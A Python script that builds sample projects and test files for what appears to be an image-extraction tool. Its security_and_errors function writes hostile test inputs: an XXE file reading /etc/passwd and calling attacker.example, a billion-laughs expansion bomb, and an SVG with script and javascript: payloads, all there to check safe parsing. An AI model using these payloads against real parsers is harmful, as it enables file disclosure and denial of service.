#!/usr/bin/env python3
"""Generates the sample projects in samples/ and the in-app sample copies in public/samples/.

Every image is created here (no third-party artwork), so the expected results are known:
see docs/SUPPORTED_FORMATS.md for what each sample should produce.
"""
import base64
import io
import math
import os
import shutil
import zipfile

from PIL import Image, ImageDraw

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
S = os.path.join(ROOT, 'samples')
PUB = os.path.join(ROOT, 'public', 'samples')


def write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = 'wb' if isinstance(data, bytes) else 'w'
    with open(path, mode, **({} if mode == 'wb' else {'encoding': 'utf-8'})) as f:
        f.write(data)


def png_bytes(img, fmt='PNG', **kw):
    buf = io.BytesIO()
    img.save(buf, fmt, **kw)
    return buf.getvalue()


def photo(w, h, hue_shift=0):
    """A soft landscape-like gradient with a sun, as a stand-in photograph."""
    img = Image.new('RGB', (w, h))
    px = img.load()
    for y in range(h):
        t = y / (h - 1)
        for x in range(w):
            u = x / (w - 1)
            r = int(40 + 180 * (1 - t) + 30 * u)
            g = int(60 + 120 * (1 - t) * (0.6 + 0.4 * u))
            b = int(140 + 100 * t)
            px[x, y] = ((r + hue_shift) % 256, g % 256, b % 256)
    d = ImageDraw.Draw(img)
    d.ellipse([w * 0.62, h * 0.18, w * 0.82, h * 0.18 + w * 0.2], fill=(255, 214, 120))
    pts = [(0, h)] + [(x, h * 0.72 - 40 * math.sin(x / w * 7) - 25 * math.sin(x / w * 17)) for x in range(0, w + 1, 8)] + [(w, h)]
    d.polygon(pts, fill=(28, 40, 60))
    return img


def logo(size, color=(124, 92, 255)):
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    d = ImageDraw.Draw(img)
    d.rounded_rectangle([0, 0, size - 1, size - 1], radius=size // 5, fill=color + (255,))
    s = size / 32
    d.line([(9 * s, 11 * s), (14 * s, 16 * s), (9 * s, 21 * s)], fill=(255, 255, 255, 255), width=max(2, int(2.5 * s)), joint='curve')
    d.line([(17 * s, 21 * s), (23 * s, 21 * s)], fill=(255, 255, 255, 255), width=max(2, int(2.5 * s)))
    return img


def badge(size, color):
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    d = ImageDraw.Draw(img)
    d.ellipse([0, 0, size - 1, size - 1], fill=color + (255,))
    d.ellipse([size * 0.3, size * 0.3, size * 0.7, size * 0.7], fill=(255, 255, 255, 230))
    return img


def zip_dir(src_dir, zip_path, arc_root):
    os.makedirs(os.path.dirname(zip_path), exist_ok=True)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for base, _, files in os.walk(src_dir):
            for name in sorted(files):
                full = os.path.join(base, name)
                z.write(full, os.path.join(arc_root, os.path.relpath(full, src_dir)))


def svg_poster():
    d = os.path.join(S, 'svg-poster')
    write(os.path.join(d, 'assets', 'photo.jpg'), png_bytes(photo(640, 400), 'JPEG', quality=86))
    write(os.path.join(d, 'assets', 'logo.png'), png_bytes(logo(128)))
    write(os.path.join(d, 'assets', 'Badge.PNG'), png_bytes(badge(96, (255, 120, 90))))
    write(os.path.join(d, 'assets', 'texture.png'), png_bytes(photo(200, 200, 90)))
    inline = base64.b64encode(png_bytes(badge(64, (60, 200, 150)))).decode()
    svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
     width="1080" height="1350" viewBox="0 0 1080 1350">
  <title>Summer Launch poster</title>
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#1b1035"/>
      <stop offset="1" stop-color="#0b0b14"/>
    </linearGradient>
    <radialGradient id="glow" cx="0.5" cy="0.5" r="0.5">
      <stop offset="0" stop-color="#8b6cff" stop-opacity="0.9"/>
      <stop offset="0.6" stop-color="#5b3fd6" stop-opacity="0.4"/>
      <stop offset="1" stop-color="#5b3fd6" stop-opacity="0"/>
    </radialGradient>
    <style>
      .headline {{ font-family: 'Archivo Black', sans-serif; font-size: 96px; fill: #ffffff; }}
      .body {{ font-family: Inter, sans-serif; font-size: 34px; fill: #c9c3e6; }}
    </style>
  </defs>
  <inkscape:metadata-note>exported by an editor</inkscape:metadata-note>

  <!-- Background and decoration -->
  <rect id="Background" x="0" y="0" width="1080" height="1350" fill="url(#bg)"/>
  <circle id="Glow" cx="820" cy="300" r="320" fill="url(#glow)"/>
  <rect id="Card" x="90" y="420" width="900" height="560" rx="36" fill="#ffffff" fill-opacity="0.06"/>

  <!-- Relative path, resolved against this file's folder -->
  <image id="Hero photo" x="130" y="460" width="820" height="480" href="assets/photo.jpg" preserveAspectRatio="xMidYMid slice"/>

  <!-- Nested, transformed group with a logo -->
  <g id="Brand" transform="translate(90 90)">
    <g id="Logo group" transform="rotate(-8 64 64)" opacity="0.95">
      <image id="Logo" x="0" y="0" width="128" height="128" xlink:href="assets/logo.png"/>
    </g>
    <text id="Brand name" x="160" y="84" style="font-family: Inter; font-size: 44px; font-weight: 700; fill: #ffffff">Northwind</text>
  </g>

  <text class="headline" x="90" y="1110">Summer</text>
  <text class="headline" x="90" y="1210" fill="#8b6cff">Launch <tspan x="90" dy="100">2026</tspan></text>
  <text class="body" x="990" y="1300" text-anchor="end">Doors open 7 PM · Pier 9</text>

  <!-- Base64 data URI -->
  <image id="Inline badge" x="900" y="80" width="96" height="96" href="data:image/png;base64,{inline}"/>

  <!-- Letter case differs from the file on disk (Badge.PNG) -->
  <image id="Badge" x="910" y="1110" width="80" height="80" href="assets/badge.png"/>

  <!-- Absolute path from the designer's computer; only matched by file name -->
  <image id="Texture" x="760" y="760" width="160" height="160" opacity="0.5" href="C:\\Users\\designer\\Pictures\\texture.png"/>

  <!-- Missing on purpose -->
  <image id="Sponsor logo" x="560" y="1120" width="160" height="60" href="assets/sponsor.png"/>

  <!-- Remote image: only loaded after the user allows remote images -->
  <image id="Map" x="740" y="1120" width="150" height="60" href="https://example.com/images/venue-map.png"/>

  <!-- Vector shapes -->
  <ellipse id="Orb" cx="980" cy="560" rx="40" ry="28" fill="#ffcc66"/>
  <polygon id="Spark" points="1000,700 1012,730 1044,734 1020,754 1028,786 1000,768 972,786 980,754 956,734 988,730" fill="#ff7a59">
    <animateTransform attributeName="transform" type="rotate" from="0 1000 744" to="360 1000 744" dur="4s" repeatCount="indefinite"/>
  </polygon>
  <path id="Wave" d="M90 1000 C 300 940, 500 1060, 720 1000 S 990 950, 990 1000 L 990 1020 L 90 1020 Z" fill="#8b6cff" fill-opacity="0.35"/>
  <line id="Divider" x1="560" y1="1240" x2="990" y2="1240" stroke="#3b3360" stroke-width="2"/>
  <rect id="Fade-in tag" x="760" y="430" width="200" height="56" rx="0" fill="#ff7a59" transform="rotate(6 860 458)">
    <animate attributeName="opacity" from="0" to="1" dur="1.2s" begin="0s"/>
  </rect>
</svg>
'''
    write(os.path.join(d, 'poster.svg'), svg)
    zip_dir(d, os.path.join(PUB, 'svg-poster.zip'), 'svg-poster')


def fb2_book():
    jpeg = base64.encodebytes(png_bytes(photo(300, 420, 40), 'JPEG', quality=80)).decode()
    pngb = base64.encodebytes(png_bytes(logo(96, (40, 160, 120)))).decode()
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
  <description>
    <title-info>
      <book-title>The Lighthouse Keeper</book-title>
      <coverpage><image l:href="#cover.jpg"/></coverpage>
    </title-info>
  </description>
  <body>
    <section>
      <title><p>Chapter One</p></title>
      <p>The lamp had not failed in forty years.</p>
      <image l:href="#emblem.png"/>
      <p>Below is a figure that was lost when the book was converted.</p>
      <image l:href="#figure-1.png"/>
    </section>
  </body>
  <binary id="cover.jpg" content-type="image/jpeg">
{jpeg}  </binary>
  <binary id="emblem.png" content-type="image/jpeg">
{pngb}  </binary>
</FictionBook>
'''
    write(os.path.join(S, 'fb2', 'lighthouse.fb2'), xml)
    shutil.copy(os.path.join(S, 'fb2', 'lighthouse.fb2'), os.path.join(PUB, 'lighthouse.fb2'))


def android_project():
    d = os.path.join(S, 'android-app')
    res = os.path.join(d, 'app', 'src', 'main', 'res')
    write(os.path.join(res, 'drawable-mdpi', 'hero.png'), png_bytes(photo(160, 100)))
    write(os.path.join(res, 'drawable-xxhdpi', 'hero.png'), png_bytes(photo(480, 300)))
    write(os.path.join(res, 'mipmap-xxxhdpi', 'ic_launcher.webp'), png_bytes(logo(192), 'WEBP', quality=90))
    write(os.path.join(res, 'drawable', 'bg_card.xml'), '''<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">
  <solid android:color="#FFFFFF"/>
  <corners android:radius="16dp"/>
</shape>
''')
    write(os.path.join(res, 'layout', 'activity_main.xml'), '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="?attr/colorSurface">

    <ImageView
        android:id="@+id/hero"
        android:layout_width="match_parent"
        android:layout_height="200dp"
        android:src="@drawable/hero"
        android:contentDescription="@string/hero_image_description" />

    <FrameLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/bg_card">
        <ImageView
            android:id="@+id/icon"
            android:layout_width="48dp"
            android:layout_height="48dp"
            app:srcCompat="@mipmap/ic_launcher" />
        <TextView
            android:id="@+id/imageTitle"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Image gallery" />
    </FrameLayout>

    <ImageButton
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@android:drawable/ic_menu_camera" />

    <ImageView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/promo_banner" />
</LinearLayout>
''')
    zip_dir(d, os.path.join(PUB, 'android-app.zip'), 'android-app')


def docx_report():
    try:
        from docx import Document
        from docx.shared import Inches
    except ImportError:
        print('python-docx not installed; skipping DOCX sample')
        return
    doc = Document()
    doc.add_heading('Quarterly site report', 1)
    doc.add_paragraph('Photos from the north pier inspection.')
    buf = io.BytesIO(png_bytes(photo(400, 260, 120)))
    doc.add_picture(buf, width=Inches(4))
    doc.add_paragraph('Team logo:')
    doc.add_picture(io.BytesIO(png_bytes(logo(128, (230, 90, 70)))), width=Inches(1))
    out = os.path.join(S, 'office', 'site-report.docx')
    os.makedirs(os.path.dirname(out), exist_ok=True)
    doc.save(out)
    shutil.copy(out, os.path.join(PUB, 'site-report.docx'))


def generic_catalog():
    d = os.path.join(S, 'catalog')
    write(os.path.join(d, 'images', 'chair.jpg'), png_bytes(photo(320, 320, 160), 'JPEG', quality=85))
    write(os.path.join(d, 'images', 'notreally.png'), 'This is a text file that only pretends to be a PNG.\n')
    photo_b64 = base64.encodebytes(png_bytes(badge(120, (90, 140, 255)))).decode()
    logo_uri = 'data:image/png;base64,' + base64.b64encode(png_bytes(logo(48))).decode()
    write(os.path.join(d, 'catalog.xml'), f'''<?xml version="1.0" encoding="UTF-8"?>
<!-- A made-up schema: element names must not be used to guess which values are images. -->
<catalog xmlns="urn:example:catalog">
  <brand>
    <name>Oak &amp; Iron</name>
    <logo src="{logo_uri}"/>
  </brand>
  <product sku="CH-001">
    <title>Lounge chair</title>
    <imageCaption>Product image of the lounge chair</imageCaption>
    <imageCount>2</imageCount>
    <thumbnail>images/chair.jpg</thumbnail>
    <photo encoding="base64">
{photo_b64}    </photo>
    <manual href="docs/manual.pdf"/>
    <swatch>images/notreally.png</swatch>
  </product>
</catalog>
''')
    zip_dir(d, os.path.join(PUB, 'catalog.zip'), 'catalog')


def security_and_errors():
    write(os.path.join(S, 'security', 'xxe.xml'), '''<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
  <!ENTITY remote SYSTEM "http://attacker.example/collect">
]>
<note><to>&secret;</to><from>&remote;</from><img src="pictures/a.png"/></note>
''')
    write(os.path.join(S, 'security', 'billion-laughs.xml'), '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
''')
    write(os.path.join(S, 'security', 'active-content.svg'), '''<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" onload="alert('svg onload')">
  <script>alert('script element')</script>
  <rect width="400" height="200" fill="#222"/>
  <foreignObject x="0" y="0" width="400" height="200"><div xmlns="http://www.w3.org/1999/xhtml" onclick="alert(1)">html</div></foreignObject>
  <image x="0" y="0" width="10" height="10" href="javascript:alert(1)"/>
  <text x="20" y="110" fill="#fff" font-size="28">Scripts never run</text>
</svg>
''')
    write(os.path.join(S, 'broken', 'unclosed-tag.xml'), '''<?xml version="1.0"?>
<layout>
  <panel name="header">
    <image src="a.png"/>
  </panel>
  <panel name="body">
    <image src="b.png">
  </panel>
</layout>
''')
    write(os.path.join(S, 'broken', 'bad-ampersand.svg'), '''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="https://cdn.example.com/img?id=7&size=large" width="100" height="100"/>
</svg>
''')
    for name in ['security/xxe.xml', 'security/active-content.svg', 'broken/unclosed-tag.xml']:
        shutil.copy(os.path.join(S, name), os.path.join(PUB, os.path.basename(name)))


if __name__ == '__main__':
    if os.path.isdir(PUB):
        shutil.rmtree(PUB)
    os.makedirs(PUB)
    svg_poster()
    fb2_book()
    android_project()
    docx_report()
    generic_catalog()
    security_and_errors()
    # One JSON bundle of the in-app samples (some hosts cannot serve .zip/.docx/.fb2 files directly).
    import json
    bundle = {}
    for name in sorted(os.listdir(PUB)):
        if name.endswith('.json'):
            continue
        with open(os.path.join(PUB, name), 'rb') as f:
            bundle[name] = base64.b64encode(f.read()).decode()
    with open(os.path.join(ROOT, 'public', 'samples.json'), 'w') as f:
        json.dump(bundle, f)
    print('Samples written to', S, 'and', PUB)
